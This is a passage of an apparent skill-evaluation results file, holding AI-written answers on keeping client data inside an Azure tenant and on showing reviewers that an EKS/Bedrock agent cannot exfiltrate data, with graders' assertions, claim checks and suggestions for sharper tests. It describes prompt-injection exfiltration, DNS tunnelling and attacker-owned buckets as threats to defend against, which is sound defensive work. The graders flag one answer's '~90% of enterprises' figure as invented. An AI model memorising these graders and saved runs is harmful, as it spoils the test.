features and telemetry are commonly out of scope", "type": "factual", "verified": true, "evidence": "Accurate and load-bearing caveat \u2014 Azure's compliance scope is per-service/per-feature, and preview features are routinely excluded. Correctly framed as 'get it in writing' rather than asserted as a specific guarantee."}, {"claim": "Many 'no data leaves our tenant' clauses actually mean 'infrastructure we own and control', which an AWS account inside the client's org would satisfy", "type": "quality", "verified": true, "evidence": "\u00a75 challenges the premise of the prompt with a concrete, cheaper alternative reading ('an AWS account inside their organization ... Bedrock stays, the port collapses to a deploy-target change'). This is a legitimate and material architectural challenge, not a dodge \u2014 it is explicitly bounded ('If the clause is genuinely Azure, our subscription, our EA \u2014 then \u00a72 is the real scope')."}, {"claim": "PII detection should run in redact mode, not block mode", "type": "quality", "verified": true, "evidence": "Justified in-line ('false positives teach the team to route around the control'). Reasonable operational judgment, stated as a recommendation rather than a requirement."}], "user_notes_summary": {"uncertainties": [], "needs_review": [], "workarounds": []}, "eval_feedback": {"suggestions": [{"reason": "This eval is NON-DISCRIMINATING as currently written: the baseline (without_skill) run passed all 7 assertions. A strong model already knows that inference, traces, and payload-bearing logs move, and that CI/IaC/code stay. To discriminate, the assertions need to reach the controls the baseline actually missed."}, {"assertion": "States that LOG and AUDIT destinations must also live inside the tenant (not shipped to a vendor-owned aggregation account)", "reason": "Both runs pass, but only the with_skill run names the OFF-BY-DEFAULT enablement gap on the Azure side (Foundry diagnostic settings off by default, Foundry public network access ON by default, AKS control-plane logs off, Storage WORM off). Consider splitting out an assertion like 'Identifies that the in-tenant audit surfaces are off by default and must be explicitly enabled (e.g. Foundry diagnostic settings, AKS control-plane logs), and that log immutability (WORM/Object Lock) is not on by default' \u2014 that is the assertion the baseline would fail."}, {"reason": "No assertion covers the single-region-vs-global inference trap (Bedrock cross-region inference profiles / Azure Global vs Data Zone vs Regional deployments). This is a real residency breach that silently exists in a default deployment, and only the with_skill run caught it ('Regional deployment only. Never Global.'). Worth an assertion \u2014 it is hard to pass without the domain knowledge."}, {"reason": "No assertion covers challenging the premise (tenant vs. cloud vs. region). Both runs did it, so it would not discriminate, but it is arguably the highest-value output of the task and currently goes unmeasured \u2014 which means a future regression that drops it would be invisible."}, {"assertion": "Identifies what CAN stay outside: things containing no client data (e.g. CI/CD, container registry/images, IaC, source code, dev/synthetic environments)", "reason": "Passes on a bare list. Consider requiring that the answer states HOW 'no client data' is enforced rather than assumed (e.g. data-class enforcement at the API + no network route/credential to client systems, per the with_skill run), and that eval golden sets built from client documents ARE client data. Both runs happened to raise this, but the assertion as written would pass on a list alone."}], "overall": "Both configurations scored 7/7 \u2014 this eval currently has zero discriminating power. The assertions test knowledge a strong base model already has (what moves, what stays). The with_skill answer is materially deeper (off-by-default Azure enablement checklist, WORM/immutability, Regional-only deployments, CMK-as-offboarding-lever, alarm set, live-proof demo), and none of that is measured. Recommend adding 2-3 assertions targeting default-state/enablement knowledge and the global-inference residency trap."}}}, {"id": "eval-0-residency-boundary-aws-to-azure-tenant-without_skill", "prompt": "customer won't let any of their data leave their azure tenant, but we built everything on AWS/Bedrock. what actually has to move and what can stay?", "eval_id": 0, "outputs": [{"name": "answer.md", "type": "text", "content": "# \"Data can't leave our Azure tenant\" \u2014 what actually has to move\n\n## First: make them define the boundary\n\n\"Won't leave our tenant\" is three different requirements, and the answer changes by ~6 months of work depending on which one they mean:\n\n1. **Residency** \u2014 \"must stay in Azure West Europe.\" Easy. Region pinning + contractual terms.\n2. **Subscription/tenant boundary** \u2014 \"the resources must be ours, in our subscription, private-linked, no vendor-side persistence, no training on our data.\" This is what ~90% of enterprises actually mean. Azure OpenAI / AI Foundry satisfies it: the resource lives in *their* subscription, private endpoint, CMK, no training on inputs.\n3. **Literal \"no Microsoft-operated multi-tenant service touches the payload\"** \u2014 then even Azure OpenAI is out and you're self-hosting open weights on their AKS with GPU node pools. Rare, but banks and some health systems say it.\n\nGet this answer in writing before you scope anything. Also spend one email probing whether Bedrock in *their own AWS account* with PrivateLink + CMK + model invocation logging to their S3 is acceptable \u2014 it usually isn't (the policy is org-wide \"Azure only\"), but it costs you nothing to ask and it's by far the cheapest outcome.\n\nAssume answer #2 for the rest of this.\n\n## The split: data plane moves, control plane stays\n\nThe clean mental model is **BYOC / in-tenant data plane**. Anything that touches customer content runs in their Azure subscription. Anything that only touches *your* code, config, and non-content telemetry stays where it is.\n\n### Has to move (touches customer content)\n\n| Today (AWS) | Azure equivalent | Notes |\n|---|---|---|\n| Bedrock inference | Azure AI Foundry / Azure OpenAI | Anthropic models are available in Microsoft Foundry \u2014 **verify current model + region availability yourself**, don't take my word for it. If Claude isn't available in their region, it's GPT-family or self-hosted. |\n| Titan/Cohere embeddings | `text-embedding-3-large`, or self-hosted BGE/E5 on AKS | See \"the hidden cost\" below. |\n| S3 document store | ADLS Gen2 / Blob, private endpoint, CMK in Key Vault | Immutability policy = your Object Lock equivalent. |\n| OpenSearch (vector + BM25) | Azure AI Search (hybrid built in), or pgvector on Postgres Flexible Server | AI Search is the closest hybrid-retrieval match. |\n| DynamoDB / RDS metadata | Cosmos DB / Azure Postgres | Chunk metadata is derived customer data. It moves. |\n| SQS / MSK carrying doc payloads | Service Bus / Event Hubs | If the payload is a pointer, not a blob, this is less painful. |\n| Docling/Ray parsing workers | AKS + GPU node pool | Raw docs pass through here. Non-negotiable. |\n| API + orchestration services | AKS (or Container Apps) | They see prompts and completions. |\n| Bedrock Guardrails | Azure AI Content Safety | Not feature-equivalent. Re-tune your thresholds. |\n| Bedrock model invocation logging | Foundry diagnostic settings \u2192 their Log Analytics / Blob | This log *contains prompts and completions*. It's customer data. |\n\n### Can stay on AWS (no customer content)\n\n- Source code, prompt templates, model config, Helm charts, Terraform modules.\n- CI/CD (GitHub Actions or whatever) \u2014 it builds and deploys *into* their tenant, it doesn't process their data.\n- Terraform state \u2014 **audit it first**. State files leak secrets and sometimes sample data. If it's clean, it stays; if not, move it to their storage account.\n- Container registry \u2014 but mirror images into their ACR, because their egress policy will block a pull from your ECR anyway. Sign the images, verify at admission.\n- Your own control plane: tenant registry, billing, feature flags, license checks.\n- **Aggregate, content-free telemetry**: latency, token counts, error rates, retrieval hit-rate. This needs an explicit carve-out in the DPA. Get it \u2014 without it you are operating blind in someone else's cloud.\n\n### The fights you'll have\n\n- **Traces.** Datadog LLM Observability / Langfuse / whatever you're using captures prompt and completion bodies. That is a straight-line exfil path out of their tenant and their security team will find it. Either self-host the trace backend in their subscription, or redact payloads at the SDK boundary and ship only spans + metrics. Don't promise \"we'll scrub it\" and rely on a regex.\n- **Eval golden sets.** If they were built from customer documents, they *are* customer data. Your evals now have to run inside their tenant against a shadow environment. Budget for this \u2014 it's the thing everyone forgets and it's what stops you from ever shipping a model upgrade again.\n- **Your engineers' debug access.** Reading their logs is data access. You need break-glass into their tenant with their approval \u2014 Entra guest + PIM with time-bound elevation, or Azure Lighthouse \u2014 not standing credentials in a shared vault.\n\n## The hidden cost nobody scopes\n\nThe embedding model changes. That means **you reindex the entire corpus, and retrieval quality changes**. Your chunking, your rerankers, your top-k, your prompt \u2014 all tuned against Titan/whatever \u2014 are now tuned against nothing. You will need to re-run your eval suite and probably re-tune. This is bigger than the infra port and it's the reason \"just swap the endpoint\" estimates are always wrong by 3x.\n\nSame story for guardrails: Content Safety categories and severity levels don't map 1:1 to Bedrock Guardrails, so your safety behavior shifts and you have to re-baseline.\n\n## How to do it without maintaining two products\n\nDon't fork. Cut abstraction seams at exactly three places and keep one codebase:\n\n1. **Model provider** \u2014 one interface for chat + embeddings. LiteLLM if you want it for free, or your own thin adapter (worth it if you're on LlamaIndex \u2014 you're mostly just swapping `LLM` and `EmbeddingModel` implementations).\n2. **Object store** \u2014 one blob interface. S3 vs. Blob is a 200-line adapter.\n3. **Vector/search store** \u2014 one retriever interface. This one is genuinely leaky (hybrid query syntax differs); expect to write it twice and test it twice.\n\nEverything else stays portable *if it's already on Kubernetes*. Your EKS workloads move to AKS with real but bounded pain: IRSA \u2192 AKS Workload Identity (both are OIDC federation, the shape is the same), IAM roles \u2192 Entra managed identities + RBAC, SGs/NACLs \u2192 NSGs + NetworkPolicy, default-deny egress via Azure Firewall with an FQDN allowlist. If anything is on Lambda/Step Functions/DynamoDB Streams, that part is a rewrite, not a port.\n\n## What I'd actually do this week\n\n1. Get the boundary definition in writing (1, 2, or 3 above) and the telemetry carve-out.\n2. Inventory every place a prompt, completion, or document body is written to disk or crosses a network boundary. That list *is* your migration scope \u2014 everything else is noise.\n3. Check Foundry model availability in their required region **before** promising Claude-class quality.\n4. Build the three adapter seams, and stand up one thin end-to-end path in their tenant (blob \u2192 parse \u2192 embed \u2192 AI Search \u2192 Foundry \u2192 response) as a spike. You'll learn more from that in a week than from a month of architecture docs.\n\nThe honest bottom line: your **inference, retrieval, storage, ingestion, and any log that carries a payload** all move. Your **build, deploy, code, and content-free metrics** stay. The migration is mostly mechanical \u2014 the part that will actually hurt is re-earning your retrieval and safety quality on a different model family.\n"}], "grading": {"eval_id": 0, "eval_name": "residency-boundary-aws-to-azure-tenant", "configuration": "without_skill", "expectations": [{"text": "States that the MODEL ENDPOINT must move inside the tenant (e.g. Azure AI Foundry / Azure OpenAI) \u2014 Bedrock cannot serve the data-bearing calls", "passed": true, "evidence": "'Has to move (touches customer content)' table, first row: 'Bedrock inference | Azure AI Foundry / Azure OpenAI'. The mental model is stated as 'Anything that touches customer content runs in their Azure subscription.' Note: the answer hedges on whether Bedrock could stay if it were in the client's own AWS account ('spend one email probing whether Bedrock in their own AWS account with PrivateLink + CMK ... is acceptable \u2014 it usually isn't'), but under the assumed reading (#2) it clearly places inference inside the Azure subscription."}, {"text": "States that the TRACE / OBSERVABILITY store must also move inside the boundary because traces contain client data", "passed": true, "evidence": "'The fights you'll have' \u2192 '**Traces.** Datadog LLM Observability / Langfuse / whatever you're using captures prompt and completion bodies. That is a straight-line exfil path out of their tenant ... Either self-host the trace backend in their subscription, or redact payloads at the SDK boundary and ship only spans + metrics.' The 'traces contain client data' rationale is explicit."}, {"text": "States that LOG and AUDIT destinations must also live inside the tenant (not shipped to a vendor-owned aggregation account)", "passed": true, "evidence": "Move table: 'Bedrock model invocation logging | Foundry diagnostic settings \u2192 their Log Analytics / Blob | This log *contains prompts and completions*. It's customer data.' And in the bottom line: 'any log that carries a payload' moves. Only content-free aggregate telemetry is allowed to stay, with an explicit DPA carve-out required."}, {"text": "Explicitly warns that a SaaS observability vendor (e.g. hosted Langfuse/Datadog) breaks the residency clause", "passed": true, "evidence": "'Datadog LLM Observability / Langfuse / whatever you're using captures prompt and completion bodies. That is a straight-line exfil path out of their tenant and their security team will find it.' Vendors named explicitly."}, {"text": "Identifies what CAN stay outside: things containing no client data (e.g. CI/CD, container registry/images, IaC, source code, dev/synthetic environments)", "passed": true, "evidence": "'Can stay on AWS (no customer content)' section: 'Source code, prompt templates, model config, Helm charts, Terraform modules'; 'CI/CD (GitHub Actions or whatever) \u2014 it builds and deploys into their tenant, it doesn't process their data'; 'Container registry \u2014 but mirror images into their ACR'; 'Aggregate, content-free telemetry'. Also correctly flags Terraform state as needing an audit first, and that eval golden sets built from customer documents ARE customer data."}, {"text": "Notes that a cloud-agnostic Kubernetes core is what makes the move feasible and that only provider bindings change", "passed": true, "evidence": "'Everything else stays portable *if it's already on Kubernetes*. Your EKS workloads move to AKS with real but bounded pain: IRSA \u2192 AKS Workload Identity (both are OIDC federation, the shape is the same), IAM roles \u2192 Entra managed identities + RBAC, SGs/NACLs \u2192 NSGs + NetworkPolicy'. The provider-binding seams are named explicitly ('Cut abstraction seams at exactly three places and keep one codebase: model provider, object store, vector/search store'), with the counter-case called out: 'If anything is on Lambda/Step Functions/DynamoDB Streams, that part is a rewrite, not a port.'"}, {"text": "Distinguishes the compliance boundary as 'everything client data touches' rather than only the app and database", "passed": true, "evidence": "'The clean mental model is BYOC / in-tenant data plane. Anything that touches customer content runs in their Azure subscription.' Operationalized as: 'Inventory every place a prompt, completion, or document body is written to disk or crosses a network boundary. That list *is* your migration scope \u2014 everything else is noise.' The move table extends well past app+DB (queues, parsing workers, invocation logs, guardrails, embeddings)."}], "summary": {"passed": 7, "failed": 0, "total": 7, "pass_rate": 1.0}, "execution_metrics": {"output_chars": 6612, "total_tokens": 33068}, "timing": {"executor_duration_seconds": 93.4, "total_duration_seconds": 93.4}, "claims": [{"claim": "~90% of enterprises mean the subscription/tenant boundary reading, and Azure OpenAI / AI Foundry satisfies it", "type": "factual", "verified": false, "evidence": "The 90% figure is fabricated precision \u2014 no source, and unverifiable. The underlying structural point (three readings of 'won't leave our tenant') is sound, but the statistic is invented."}, {"claim": "The embedding model change forces a full corpus reindex and retrieval re-tuning, and this is bigger than the infra port", "type": "quality", "verified": true, "evidence": "'The hidden cost nobody scopes' \u2014 a genuinely non-obvious and correct observation (embedding-space change invalidates chunking/reranker/top-k tuning). Notably this is a RAG-specific insight the with_skill run did NOT surface. It assumes the platform is a RAG system, which the prompt does not state, but it is flagged as a conditional cost, not a fact about the user's system."}, {"claim": "Anthropic models are available in Microsoft Foundry", "type": "factual", "verified": true, "evidence": "Correctly hedged in-line: 'verify current model + region availability yourself, don't take my word for it. If Claude isn't available in their region, it's GPT-family or self-hosted.' The uncertainty is surfaced rather than asserted."}, {"claim": "Bedrock in the client's own AWS account with PrivateLink + CMK could satisfy the clause and is worth probing", "type": "quality", "verified": true, "evidence": "Correct premise-challenge, same substance as the with_skill run's \u00a75, though given one sentence rather than a structured decision point."}], "user_notes_summary": {"uncertainties": ["Model/region availability in Foundry is explicitly flagged as unverified and delegated to the reader"], "needs_review": [], "workarounds": []}, "eval_feedback": {"suggestions": [{"reason": "The baseline passed 7/7 \u2014 identical to with_skill. This eval has NO discriminating power as written. A strong base model already knows the residency split. Assertions must move to the layer the baseline actually misses."}, {"reason": "Concrete gaps the baseline has that no assertion catches: (a) no mention that Azure audit surfaces are OFF BY DEFAULT (Foundry diagnostic settings, AKS control-plane logs) or that Foundry public network access is ON by default; (b) no log immutability / WORM (Object Lock equivalent) for audit evidence \u2014 it mentions Blob immutability only for the document store; (c) no Global-vs-Regional deployment residency trap; (d) no default-deny NetworkPolicy / zero-internet-egress target inside the tenant (it says 'Azure Firewall with an FQDN allowlist', which is weaker); (e) no DNS-as-exfil-channel; (f) no alarm set; (g) no live-proof demo for the client's security team. Each of these is a candidate discriminating assertion."}, {"assertion": "Explicitly warns that a SaaS observability vendor (e.g. hosted Langfuse/Datadog) breaks the residency clause", "reason": "Both runs pass, but they differ in strength: the baseline offers 'redact payloads at the SDK boundary and ship only spans + metrics' as an acceptable alternative to moving the trace store, while the with_skill run rules SaaS observability out entirely ('No SaaS observability ... no vendor-side OTLP collector'). If the skill's position is that redaction-to-a-vendor is NOT an acceptable residency answer, the assertion should say so \u2014 as written it accepts both."}, {"reason": "The baseline invented a statistic ('~90% of enterprises') that no assertion penalizes. Consider a negative assertion class (e.g. 'makes no unsourced quantitative claims about client behavior') if fabricated precision matters for this skill's credibility in front of security reviewers."}], "overall": "Baseline and with_skill both 7/7. The assertions measure the well-known half of the problem (what moves / what stays) and none measure the default-state, evidence, and enforcement half where the skill actually adds value. Recommend rewriting 2-3 assertions toward off-by-default enablement, log immutability, and the Global-inference residency trap."}}}, {"id": "eval-1-prove-agent-cannot-exfiltrate-with_skill", "prompt": "we're on EKS calling Bedrock. security review is asking 'what stops the agent from sending data somewhere it shouldn't.' what do I actually show them?", "eval_id": 1, "outputs": [{"name": "answer.md", "type": "text", "content": "# \"What stops the agent from sending data somewhere it shouldn't?\"\n\nReframe the question for them first, because it's the frame that makes the rest of the answer legible:\n\n> In an agentic system, **every reachable network destination is an exfiltration channel available to a hijacked agent** \u2014 and a tool call is an egress channel. So the control isn't \"we trust the model not to.\" The control is that the set of destinations the agent pod can reach equals the set of named, reviewed dependencies. Prompt injection can at worst misuse an approved channel; it cannot open a new one.\n\nThat's MITRE ATLAS's exfiltration-through-tool-calls and OWASP LLM02, and it's the standard a security reviewer is (usually without saying so) actually testing you against.\n\nThen show four layers, in this order, because each one is what makes the previous one's failure survivable.\n\n---\n\n## 1. The network: default-deny egress, allow by name\n\nThis is the load-bearing answer. Everything else is depth.\n\n- **No NAT-to-anywhere.** Agent workloads run in private subnets. The list of things the platform legitimately needs to reach is short enough to write on a napkin \u2014 Bedrock, S3, RDS, KMS, ECR, CloudWatch, STS \u2014 **and every one of those has a VPC endpoint.** So the honest target is *zero* internet egress from workload subnets, not \"restricted\" egress. If you're running a NAT gateway for the agent nodegroup today, that's the finding, and it's the one to fix before the review.\n- **Bedrock over PrivateLink.** Interface endpoint with private DNS, so `bedrock-runtime.*` resolves in-VPC with no code change. The model call never touches the internet.\n- **S3 via gateway endpoint with an endpoint policy carrying an `aws:ResourceAccount` condition.** This one is worth calling out explicitly to the reviewer: tight IAM on *your* buckets does nothing to stop `PutObject` to an attacker-owned bucket. The endpoint policy is what closes that path.\n- **DNS is egress too.** An agent that can resolve arbitrary names can tunnel data out through queries alone. Cluster resolver only, external resolvers blocked in NetworkPolicy, Route 53 Resolver query logs on in prod.\n\n**In-cluster, NetworkPolicy default-deny ingress+egress per namespace**, then the named flows only. VPC CNI enforces NetworkPolicy natively on EKS. What's absent on purpose is as important as what's present \u2014 show them the deny list, not just the allow list:\n\n```\ngateway     \u2192 agent-api:8000, RDS, S3-endpoint\nagent-api   \u2192 Bedrock-endpoint, RDS, S3-endpoint, otel-collector\notel        \u2192 trace-store\neverything  \u2192 kube-dns:53 (cluster resolver only)\n\nabsent on purpose: agent\u2192internet, agent\u2192agent, anything\u2192trace-store except the collector\n```\n\n## 2. Identity: the agent's role is the capability list, compiled\n\n- **EKS Pod Identity** (or IRSA), one role per service, no sharing. Credentials scoped to the service account, short-lived, never in env vars or files.\n- **The gateway role has no `bedrock:*` at all** \u2014 it routes, it never invokes. Only the agent role can call a model.\n- **`bedrock:InvokeModel*` scoped to named model ARNs.** The agent physically cannot call a model that hasn't been through your eval pipeline.\n- **Ban Bedrock API keys org-wide via SCP** (`bedrock:BearerTokenType` / `bedrock:CallWithBearerToken` condition keys). They're new, and they recreate exactly the static-credential problem you eliminated with Pod Identity. A reviewer who knows Bedrock will ask.\n\n## 3. The endpoint policy: the same allowlist, a third time\n\nThe Bedrock PrivateLink endpoint's resource policy repeats the model-ARN allowlist and scopes to your agent roles. The point of the repetition \u2014 say this out loud in the review \u2014 is that **a leaked credential used from inside the VPC still can't reach other models, and no credential works from outside the VPC at all.** Model access is governed at four layers (SCP \u2192 account model grants \u2192 role \u2192 endpoint policy) so that no single misconfiguration un-governs it.\n\n## 4. Guardrails: the outer moat, not the castle\n\nBedrock Guardrails, attached **org-wide via Organizations policy** so \"every model call in these accounts passes a guardrail\" is an org invariant rather than per-app diligence. Turn on: the **Prompt Attack** filter (a managed injection classifier you don't maintain), the **sensitive-information filter in redact mode** (managed twin of your own egress redactor \u2014 different engine, provider-maintained, which is exactly what defense-in-depth wants), and a small word filter for client-named markers. Configs in IaC, hits traced.\n\nBe honest about the ordering: this is the provider's second net over your controls, not your primary one. Reviewers respect that framing more than they respect \"we use AWS Guardrails\" as a headline.\n\n---\n\n## The enablement checklist \u2014 this is the deliverable they actually want\n\nThe controls that matter most are **off by default**, and \"we have CloudTrail\" does not mean the agent runtime is logged. Walk in with this table filled out:\n\n| Surface | Default | You need |\n|---|---|---|\n| CloudTrail management events (who called which model, when) | on | keep, org trail |\n| **CloudTrail data events** (Bedrock agent-runtime, S3 object-level) | **off** | enable |\n| **Bedrock model invocation logging** (full request/response payloads) | **off** | enable \u2192 in-tenant bucket only |\n| **EKS control-plane logs** (all five: api, audit, authenticator, controllerManager, scheduler) | **off** | enable all five |\n| Route 53 Resolver query logs (DNS egress attempts) | off | enable in prod |\n| GuardDuty + Security Hub | varies | on, findings routed |\n\nShip audit logs to **S3 with Object Lock in COMPLIANCE mode** + CloudTrail log-file integrity validation. Object Lock COMPLIANCE mode means nobody, including root, can shorten retention \u2014 that single property is what converts \"we keep logs\" into \"our logs are evidence.\"\n\nAnd the trap that bites people at exactly this point: **the trace store and the log destinations are inside the boundary too.** If your OTel/Langfuse traces or your logs ship to a vendor-owned aggregation account, you have built an exfiltration channel with your own telemetry pipeline and it will not survive the review. Check this before they do.\n\n## The alarm set\n\nAn audit log nobody reads is decoration. Minimum:\n\n- Bedrock invocation by **any principal other than the agent roles** \u2014 the \"someone found a credential\" alarm.\n- Invocation of a **model ID outside the allowlist** \u2014 should be impossible across four policy layers; if it fires, a policy layer changed, and that's a capability-violation incident by definition.\n- NetworkPolicy or VPC-endpoint-policy modification. Object Lock bucket policy changes.\n- `kubectl exec` into an agent pod in prod (EKS audit log filter).\n\n---\n\n## What to actually put in front of them in the room\n\nOne diagram (the boundary, with the named flows from \u00a71 overlaid) and **two live proofs**:\n\n1. **The 30-second `kubectl` demo.** Shell into an agent pod. `curl https://example.com` \u2192 blocked. `dig example.com` against an external resolver \u2192 blocked. `aws s3 cp` to a bucket outside the allowed account \u2192 denied by endpoint policy. This lands the argument better than any document you can write, and it's the one thing a skeptical reviewer remembers.\n2. **The policies as code, in the repo, with a review history.** VPC endpoint policies, the SCP, NetworkPolicies, the guardrail config \u2014 all Terraform, all PR-reviewed. This is the difference between \"we configured it\" and \"a new destination is a reviewed diff, not a discovered behavior.\" Back it with Checkov/OPA rules on the plan asserting the invariants (endpoint policies not widened, invocation logging not disabled, Object Lock not removed) and drift detection on the boundary resources alerting as a **security** event, not a hygiene ticket.\n\n## The one gap to name yourself\n\nIAM and the network do **coarse** (service \u00d7 prefix \u00d7 action \u00d7 destination). They cannot express \"this agent may only touch *this session's* records.\" That fine-grained half is application code \u2014 a capability manifest, an egress redactor in front of the model call, schema validation on outputs. Say so, and say which layer backstops which; a reviewer trusts the architect who volunteers the boundary of their own control far more than the one who claims the infrastructure handles everything.\n\nIf you want to build that half, it's the `ai-engineering-implementation` skill's territory.\n\n## The sentence to close with\n\n> \"Bypassing this requires defeating code review, image signing, admission control, IAM, the endpoint policy, and NetworkPolicy simultaneously. Each of those failures is independently logged and alarmed. That stacked cost is the design.\"\n\nUseful shared vocabulary if their team has an AWS background: this is **Scope 3** on AWS's Generative AI Security Scoping Matrix, and the stack above maps 1:1 onto AWS's own prescriptive guidance for agentic AI security. Saying \"our controls match AWS's published posture for our scope\" does real work in a review.\n"}], "grading": {"eval_id": 1, "eval_name": "prove-agent-cannot-exfiltrate", "configuration": "with_skill", "expectations": [{"text": "Recommends default-deny egress with no general internet route from workload subnets", "passed": true, "evidence": "\u00a71: '**No NAT-to-anywhere.** Agent workloads run in private subnets. ... the honest target is *zero* internet egress from workload subnets, not \"restricted\" egress. If you're running a NAT gateway for the agent nodegroup today, that's the finding, and it's the one to fix before the review.'"}, {"text": "Names VPC interface endpoints / PrivateLink for Bedrock so model traffic never traverses the internet", "passed": true, "evidence": "\u00a71: '**Bedrock over PrivateLink.** Interface endpoint with private DNS, so `bedrock-runtime.*` resolves in-VPC with no code change. The model call never touches the internet.'"}, {"text": "Recommends Kubernetes NetworkPolicies (default-deny, named allowed flows) for east-west and egress control", "passed": true, "evidence": "\u00a71: '**In-cluster, NetworkPolicy default-deny ingress+egress per namespace**, then the named flows only. VPC CNI enforces NetworkPolicy natively on EKS.' Followed by an explicit flow table AND a deny list: 'absent on purpose: agent\u2192internet, agent\u2192agent, anything\u2192trace-store except the collector' \u2014 east-west (agent\u2192agent) is covered."}, {"text": "Identifies DNS as an exfiltration channel that must also be restricted/logged", "passed": true, "evidence": "\u00a71: '**DNS is egress too.** An agent that can resolve arbitrary names can tunnel data out through queries alone. Cluster resolver only, external resolvers blocked in NetworkPolicy, Route 53 Resolver query logs on in prod.' Both the restriction and the logging are named."}, {"text": "Recommends S3 endpoint policy / aws:ResourceAccount condition to prevent writes to attacker-owned buckets", "passed": true, "evidence": "\u00a71: '**S3 via gateway endpoint with an endpoint policy carrying an `aws:ResourceAccount` condition.** ... tight IAM on *your* buckets does nothing to stop `PutObject` to an attacker-owned bucket. The endpoint policy is what closes that path.' The exact condition key is named and the reason the naive control fails is stated."}, {"text": "Recommends model-ARN allowlisting via IAM role and/or SCP and/or VPC endpoint policy (layered)", "passed": true, "evidence": "All four layers, explicitly layered: \u00a72 '`bedrock:InvokeModel*` scoped to named model ARNs'; \u00a72 'Ban Bedrock API keys org-wide via SCP'; \u00a73 'The Bedrock PrivateLink endpoint's resource policy repeats the model-ARN allowlist and scopes to your agent roles ... Model access is governed at four layers (SCP \u2192 account model grants \u2192 role \u2192 endpoint policy) so that no single misconfiguration un-governs it.'"}, {"text": "Names audit surfaces that are OFF BY DEFAULT and must be enabled (Bedrock model invocation logging and/or CloudTrail data events)", "passed": true, "evidence": "A dedicated 'enablement checklist' table with a Default column: '**CloudTrail data events** (Bedrock agent-runtime, S3 object-level) | **off** | enable'; '**Bedrock model invocation logging** (full request/response payloads) | **off** | enable \u2192 in-tenant bucket only'; '**EKS control-plane logs** (all five) | **off** | enable all five'; 'Route 53 Resolver query logs | off | enable in prod'. Framed correctly: 'The controls that matter most are off by default, and \"we have CloudTrail\" does not mean the agent runtime is logged.'"}, {"text": "Offers a concrete demonstrable proof for the reviewer (e.g. exec into a pod and show an outbound curl / external DNS resolution being blocked)", "passed": true, "evidence": "'**The 30-second `kubectl` demo.** Shell into an agent pod. `curl https://example.com` \u2192 blocked. `dig example.com` against an external resolver \u2192 blocked. `aws s3 cp` to a bucket outside the allowed account \u2192 denied by endpoint policy.' Plus a second proof (policies-as-code in the repo with review history and Checkov/OPA plan assertions)."}, {"text": "Frames the agent threat model: every reachable destination / tool call is a potential exfiltration channel", "passed": true, "evidence": "Opens with exactly this frame: 'In an agentic system, **every reachable network destination is an exfiltration channel available to a hijacked agent** \u2014 and a tool call is an egress channel. So the control isn't \"we trust the model not to.\" The control is that the set of destinations the agent pod can reach equals the set of named, reviewed dependencies. Prompt injection can at worst misuse an approved channel; it cannot open a new one.' Grounded in MITRE ATLAS and OWASP LLM02."}], "summary": {"passed": 9, "failed": 0, "total": 9, "pass_rate": 1.0}, "execution_metrics": {"output_chars": 7186, "total_tokens": 48327}, "timing": {"executor_duration_seconds": 73.7, "total_duration_seconds": 73.7}, "claims": [{"claim": "Bedrock API keys can be banned org-wide via SCP using bedrock:BearerTokenType / bedrock:CallWithBearerToken condition keys", "type": "factual", "verified": true, "evidence": "Bedrock API keys (long-lived bearer credentials) are a real and recent Bedrock feature, and AWS exposes condition keys to deny bearer-token calls org-wide. The reasoning given ('they recreate exactly the static-credential problem you eliminated with Pod Identity') is correct and is a control the baseline run missed entirely."}, {"claim": "VPC CNI enforces NetworkPolicy natively on EKS", "type": "factual", "verified": true, "evidence": "Correct \u2014 the Amazon VPC CNI has supported native Kubernetes NetworkPolicy enforcement since v1.14, no Calico/Cilium required."}, {"claim": "S3 Object Lock in COMPLIANCE mode means nobody, including root, can shorten retention", "type": "factual", "verified": true, "evidence": "Correct. This is the precise property that distinguishes COMPLIANCE from GOVERNANCE mode, and the answer draws the right conclusion from it ('that single property is what converts \"we keep logs\" into \"our logs are evidence\"')."}, {"claim": "IAM and the network cannot express 'this agent may only touch this session's records' \u2014 that half is application code", "type": "quality", "verified": true, "evidence": "'The one gap to name yourself' \u2014 an accurate and self-limiting statement of what infrastructure controls can and cannot do. Volunteering this boundary is a genuine quality signal, not a hedge."}, {"claim": "This is Scope 3 on AWS's Generative AI Security Scoping Matrix", "type": "factual", "verified": true, "evidence": "AWS's Generative AI Security Scoping Matrix does define Scope 3 as 'pre-trained models' (building an application on a third-party foundation model, e.g. via Bedrock), which matches EKS-calling-Bedrock. Correct mapping."}], "user_notes_summary": {"uncertainties": [], "needs_review": [], "workarounds": []}, "eval_feedback": {"suggestions": [{"reason": "This eval has SOME discriminating power but not much: with_skill 9/9 vs baseline 8/9. Only assertion 7 (off-by-default audit surfaces) separated them. Assertions 1-6, 8, 9 are all satisfied by a strong base model unaided."}, {"reason": "Real gaps in the baseline that no assertion catches, and which would make good discriminating assertions: (a) the SCP ban on Bedrock API keys / bearer-token credentials \u2014 a recent, non-obvious static-credential reintroduction the baseline missed entirely; (b) log immutability as evidence (S3 Object Lock COMPLIANCE mode + CloudTrail log-file integrity validation) \u2014 the baseline mentions Object Lock in one clause but does not explain why COMPLIANCE mode is the load-bearing property; (c) EKS control-plane audit logs (all five) being off by default; (d) an ALARM SET on the audit logs ('an audit log nobody reads is decoration') \u2014 the baseline produces evidence artifacts but no detection; (e) policy-as-code assertions on the Terraform plan so widening the boundary is a failed plan rather than a discovered incident. (a), (c) and (d) are entirely absent from the baseline."}, {"assertion": "Recommends S3 endpoint policy / aws:ResourceAccount condition to prevent writes to attacker-owned buckets", "reason": "Well-designed and near-discriminating \u2014 it names a specific condition key that only someone who has thought about attacker-owned-bucket exfil would reach for. The baseline passed it via the sibling key aws:ResourceOrgID, which is a legitimate equivalent. Consider accepting either key explicitly in the assertion text so future grading is unambiguous."}, {"assertion": "Frames the agent threat model: every reachable destination / tool call is a potential exfiltration channel", "reason": "Both runs pass, but note the baseline actually goes FURTHER on one axis: it explicitly handles the case where prompt injection makes the agent call a legitimate tool with attacker-chosen arguments (send_email(to=...), http_get(url=...)) and prescribes server-side destination allowlists. The with_skill run asserts 'a tool call is an egress channel' but defers tool design to a sibling skill. If tool-argument exfil is in scope for this skill, that is a real coverage gap worth its own assertion; if it is intentionally out of scope, the current phrasing ('/ tool call') is misleading."}], "overall": "The best of the two evals \u2014 but only 1 of 9 assertions discriminated. The baseline produces a genuinely strong answer, so the bar has to be raised to the controls that require domain depth: off-by-default enablement (already there and working), Bedrock API key / bearer-token SCP, Object Lock COMPLIANCE-mode semantics, an alarm set on the audit surfaces, and policy-as-code drift enforcement."}}}, {"id": 